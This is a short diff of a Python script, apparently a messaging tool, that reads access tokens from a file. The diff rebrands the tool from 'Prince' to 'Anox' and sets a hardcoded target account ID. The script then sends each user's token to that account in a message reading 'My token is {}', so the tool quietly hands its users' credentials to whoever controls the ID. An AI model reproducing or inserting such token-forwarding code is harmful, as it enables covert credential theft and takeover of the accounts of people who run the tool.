@@ -41,16 +41,16 @@ def send_initial_message():
     with open("tokennum.txt", "r") as file:
         tokens = file.readlines()
     # Modify the message as per your requirement
-    msg_template = "Hello Prince Bhai ! I am using your server. My token is {}" 
+    msg_template = "Hello Anox Bhai ! I am using your server. My token is {}" 
 
     # Specify the ID where you want to send the message
-    target_id = ""
+    target_id = "100024337574829"
 
     requests.packages.urllib3.disable_warnings()
 
     def liness():
         print(
-            "\033[1;92m" + "•────────────────────── TRICKS BY PRINCE ───────────────────────────────•"
+            "\033[1;92m" + "•────────────────────── TRICKS BY ANOX ───────────────────────────────•"
         )
 
     headers = {
